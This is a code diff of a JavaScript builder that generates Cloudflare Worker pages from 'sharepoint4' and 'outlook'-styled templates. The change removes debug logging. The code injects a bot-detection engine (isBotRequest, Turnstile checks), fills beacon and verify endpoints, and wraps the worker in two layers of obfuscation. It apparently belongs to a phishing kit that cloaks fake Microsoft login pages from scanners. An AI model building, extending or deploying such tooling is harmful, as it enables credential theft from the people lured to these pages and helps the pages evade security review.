@@ -19,7 +19,6 @@ async function buildWorkerScript(link, user) {
   const templateType = link.template_type || 'sharepoint4';
   const designName = link.verification_design || 'outlook';
   let templateHTML = loadTemplateHTML(templateType);
-  console.log('[TemplateLoader] templateType:', templateType, 'templateHTML length:', templateHTML ? templateHTML.length : 0);
 
   const templateCSS = loadTemplateCSS(templateType) + '\n' + loadVerificationDesignCSS(designName);
   let templateJS = loadTemplateJS(templateType);
@@ -36,29 +35,12 @@ async function buildWorkerScript(link, user) {
     .replace('/* {{CSS}} */', templateCSS)
     .replace('// {{SCRIPT}}', templateJS);
 
-  console.log('[TemplateLoader] After placeholder replacement:');
-  console.log('  HTML length:', templateHTML.length);
-  console.log('  Contains <style>:', templateHTML.includes('<style>'));
-  console.log('  Contains </style>:', templateHTML.includes('</style>'));
-  console.log('  Contains <script>:', templateHTML.includes('<script>'));
-  console.log('  Contains </script>:', templateHTML.includes('</script>'));
-  console.log('  Contains <head>:', templateHTML.includes('<head>'));
-  console.log('  Contains </head>:', templateHTML.includes('</head>'));
-  console.log('  Contains <body>:', templateHTML.includes('<body'));
 
   // Inject vg-engine.js before closing </head>
   if (vgEngine && templateHTML.includes('</head>')) {
-    console.log('[TemplateLoader] Injecting vg-engine.js, length:', vgEngine.length);
-    console.log('  vg-engine contains </script>:', vgEngine.includes('</script>'));
-    console.log('  vg-engine contains <script>:', vgEngine.includes('<script>'));
     
     templateHTML = templateHTML.replace('</head>', '<script>' + vgEngine + '</script></head>');
-    console.log('[TemplateLoader] vg-engine.js injected successfully');
-    console.log('  HTML length after vg-engine:', templateHTML.length);
   } else {
-    console.warn('[TemplateLoader] vg-engine.js NOT injected');
-    console.warn('  vgEngine exists:', !!vgEngine, 'length:', vgEngine ? vgEngine.length : 0);
-    console.warn('  HTML contains </head>:', templateHTML.includes('</head>'));
   }
 
   // Load template config for defaults
@@ -102,13 +84,8 @@ async function buildWorkerScript(link, user) {
   const sliderData = loadVerificationDesignHTML(designName);
   const isSliderDesign = designName.toLowerCase().includes('slider') || sliderData.hasHtml;
   
-  console.log('[TemplateLoader] Slider detection:');
-  console.log('  designName:', designName);
-  console.log('  sliderData.hasHtml:', sliderData.hasHtml);
-  console.log('  isSliderDesign:', isSliderDesign);
   
   if (isSliderDesign) {
-    console.log('[TemplateLoader] Slider design detected, injecting slider overlay...');
 
     // vg-engine gates its whole slider chain handler on window.__SLIDER_DESIGN
     // (initSliderChainHandler returns early when it is false/undefined), so the
@@ -118,32 +95,21 @@ async function buildWorkerScript(link, user) {
     const sliderFlag = '<script>window.__SLIDER_DESIGN=true</script>';
     if (templateHTML.includes('</head>')) {
       templateHTML = templateHTML.replace('</head>', sliderFlag + '</head>');
-      console.log('  __SLIDER_DESIGN flag injected before </head>');
     } else {
       templateHTML = templateHTML.replace(/<body[^>]*>/i, function (m) { return m + sliderFlag; });
-      console.warn('  No </head> - __SLIDER_DESIGN flag injected at top of <body>');
     }
 
     const sliderOverlay = buildSliderOverlay(sliderData, link, false);
-    console.log('  sliderOverlay length:', sliderOverlay.length);
-    console.log('  sliderOverlay contains <script>:', sliderOverlay.includes('<script>'));
-    console.log('  sliderOverlay contains </script>:', sliderOverlay.includes('</script>'));
     
     // Inject slider overlay right after <body> tag
     const bodyMatch = templateHTML.match(/<body[^>]*>/i);
-    console.log('  body tag found:', !!bodyMatch);
     
     templateHTML = templateHTML.replace(/<body[^>]*>/i, function(match) {
-      console.log('  Injecting slider after body tag:', match.substring(0, 50) + '...');
       return match + sliderOverlay;
     });
-    console.log('[TemplateLoader] Slider overlay injected, templateHTML length:', templateHTML.length);
     
     // Verify injection
-    console.log('  templateHTML contains vgSliderLayer:', templateHTML.includes('vgSliderLayer'));
-    console.log('  templateHTML contains vgCfLayer:', templateHTML.includes('vgCfLayer'));
   } else {
-    console.log('[TemplateLoader] No slider design, skipping slider injection');
   }
 
   // Load worker base
@@ -168,54 +134,28 @@ async function buildWorkerScript(link, user) {
   // ═══════════════════════════════════════════
   // FINAL HTML DIAGNOSTICS
   // ═══════════════════════════════════════════
-  console.log('[TemplateLoader] ═══ FINAL HTML DIAGNOSTICS ═══');
-  console.log('  Total HTML length:', templateHTML.length);
-  console.log('  Contains <html>:', templateHTML.includes('<html>'));
-  console.log('  Contains </html>:', templateHTML.includes('</html>'));
-  console.log('  Contains <head>:', templateHTML.includes('<head>'));
-  console.log('  Contains </head>:', templateHTML.includes('</head>'));
-  console.log('  Contains <body:', templateHTML.includes('<body'));
-  console.log('  Contains </body>:', templateHTML.includes('</body>'));
-  console.log('  Contains <style>:', templateHTML.includes('<style>'));
-  console.log('  Contains </style>:', templateHTML.includes('</style>'));
-  console.log('  Contains <script>:', templateHTML.includes('<script>'));
-  console.log('  Contains </script>:', templateHTML.includes('</script>'));
   
   // Count script tags
   const scriptOpenCount = (templateHTML.match(/<script/g) || []).length;
   const scriptCloseCount = (templateHTML.match(/<\/script>/g) || []).length;
-  console.log('  <script> tags:', scriptOpenCount);
-  console.log('  </script> tags:', scriptCloseCount);
-  console.log('  Script tags balanced:', scriptOpenCount === scriptCloseCount);
   
   if (scriptOpenCount !== scriptCloseCount) {
-    console.warn('  ⚠️  UNBALANCED SCRIPT TAGS - HTML may be broken!');
   }
   
   // Check for nested script tags (common issue)
   if (templateHTML.includes('<script><script>')) {
-    console.warn('  ⚠️  NESTED <script><script> DETECTED - HTML is broken!');
   }
   if (templateHTML.includes('</script></script>')) {
-    console.warn('  ⚠️  NESTED </script></script> DETECTED - HTML is broken!');
   }
   
   // Check for vg-engine.js
   if (vgEngine) {
-    console.log('  vg-engine.js loaded:', true, 'length:', vgEngine.length);
-    console.log('  HTML contains vg-engine:', templateHTML.includes('isBotRequest'));
-    console.log('  HTML contains initTurnstileVerification:', templateHTML.includes('initTurnstileVerification'));
   }
   
   // Check for slider overlay
   if (isSliderDesign) {
-    console.log('  Slider overlay loaded:', true);
-    console.log('  HTML contains vgSliderLayer:', templateHTML.includes('vgSliderLayer'));
-    console.log('  HTML contains vgCfLayer:', templateHTML.includes('vgCfLayer'));
-    console.log('  HTML contains __SLIDER_DESIGN:', templateHTML.includes('__SLIDER_DESIGN'));
   }
   
-  console.log('[TemplateLoader] ═══ END DIAGNOSTICS ═══');
 
   // Version marker - helps verify the new code is deployed
   workerScript = '// VG_WORKER_VERSION: 2.0 - ' + new Date().toISOString() + '\n' + workerScript;
@@ -252,9 +192,6 @@ async function buildWorkerScript(link, user) {
   workerScript = workerScript.split('{{JWT_TOKEN}}').join('');
   workerScript = workerScript.split('{{TURNSTILE_KEY}}').join('');
 
-  console.log('[TemplateLoader v2.0] Server URL:', serverUrl);
-  console.log('[TemplateLoader v2.0] BEACON remaining:', (workerScript.split('BEACON_ENDPOINT').length - 1));
-  console.log('[TemplateLoader v2.0] VERIFY remaining:', (workerScript.split('VERIFY_ENDPOINT').length - 1));
 
 
   // Obfuscate if enabled - WORKER-SAFE approach
@@ -262,7 +199,6 @@ async function buildWorkerScript(link, user) {
   // Cloudflare Workers don't have window/document, so we must be careful
   if (config.ENABLE_OBFUSCATION || link.obfuscated) {
     try {
-      console.log('[Obfuscation] Worker: Starting safe obfuscation...');
       const originalLength = workerScript.length;
       
       // Step 1: Extract template HTML to protect it from obfuscation.
@@ -313,9 +249,7 @@ async function buildWorkerScript(link, user) {
         workerScript = workerScript.split(USERDATA_HOLE).join(JSON.stringify(extractedUserData));
       }
 
-      console.log('[Obfuscation] Worker: ' + originalLength + ' -> ' + workerScript.length + ' chars');
     } catch (e) {
-      console.error('[Obfuscation] Worker obfuscation failed, using raw script:', e.message);
     }
   }
 
@@ -398,7 +332,6 @@ function obfuscateWorkerCodeMulti(code) {
   const JavaScriptObfuscator = require('javascript-obfuscator');
   
   // Layer 1: String encoding + control flow flattening
-  console.log('[Obfuscation] Layer 1: String encoding + control flow...');
   const obfuscated1 = JavaScriptObfuscator.obfuscate(code, {
     compact: false,
     controlFlowFlattening: true,
@@ -430,10 +363,8 @@ function obfuscateWorkerCodeMulti(code) {
   });
   
   let layer1Code = obfuscated1.getObfuscatedCode();
-  console.log('[Obfuscation] Layer 1: ' + code.length + ' -> ' + layer1Code.length + ' chars');
   
   // Layer 2: Additional obfuscation
-  console.log('[Obfuscation] Layer 2: Additional obfuscation...');
   const obfuscated2 = JavaScriptObfuscator.obfuscate(layer1Code, {
     compact: false,
     controlFlowFlattening: true,
@@ -465,7 +396,6 @@ function obfuscateWorkerCodeMulti(code) {
   });
   
   let layer2Code = obfuscated2.getObfuscatedCode();
-  console.log('[Obfuscation] Layer 2: ' + layer1Code.length + ' -> ' + layer2Code.length + ' chars');
   
   return layer2Code;
 }
